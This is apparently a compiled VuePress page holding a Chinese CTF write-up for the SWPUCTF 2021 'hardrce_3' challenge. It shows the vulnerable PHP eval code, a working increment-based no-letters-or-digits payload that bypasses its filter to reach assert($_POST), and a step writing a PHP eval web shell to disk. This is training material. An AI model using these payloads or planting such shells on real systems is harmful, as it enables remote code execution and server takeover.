import{_,r as e,o as p,c as o,a as n,b as s,d as t,e as l}from"./app-3b511de6.js";const c={},i=l(`<div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;wllm&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$wllm</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;wllm&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">&#39; &#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;\\^&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;\\~&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;\\|&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/&#39;</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;/m&#39;</span><span class="token punctuation">,</span> <span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/[a-zA-Z0-9]/is&#39;</span><span class="token punctuation">,</span> <span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Ra&#39;sAlGhul说用字母数字是没有灵魂的！&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span><span class="token punctuation">;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;蔡总说：注意审题！！！&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>无字母数字 RCE 而且此题不能 异或，取反，或 可以自增</p><h4 id="自增" tabindex="-1"><a class="header-anchor" href="#自增" aria-hidden="true">#</a> 自增</h4><div class="language-url line-numbers-mode" data-ext="url"><pre class="language-url"><code><span class="token authority"><span class="token authority-delimiter">//</span></span>测试发现7.0.12以上版本不可使用
<span class="token authority"><span class="token authority-delimiter">//</span></span>使用时需要url编码下
<span class="token path">$_=</span>[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
固定格式 构造出来的 assert($_POST[_]);
然后post传入   _=phpinfo();
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后利用 file_put_contents() 写入马，蚁剑连接查看</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>_=file_put_contents(&quot;1.php&quot;,&quot;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;shell&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>&quot;);
\\@
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,6),u={href:"https://blog.csdn.net/miuzzx/article/details/109143413",target:"_blank",rel:"noopener noreferrer"},r={href:"https://www.cnblogs.com/aninock/p/16461151.html",target:"_blank",rel:"noopener noreferrer"};function $(d,k){const a=e("ExternalLinkIcon");return p(),o("div",null,[i,n("p",null,[s("参考 "),n("a",u,[s("无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_无数字正则匹配绕过取反脚本_yu22x的博客-CSDN博客"),t(a)])]),n("p",null,[n("a",r,[s("NSS日刷-[SWPUCTF 2021 新生赛]hardrce_3-open_basedir绕过 - Aninock - 博客园 (cnblogs.com)"),t(a)])])])}const m=_(c,[["render",$],["__file","hardrce_3.html.vue"]]);export{m as default};
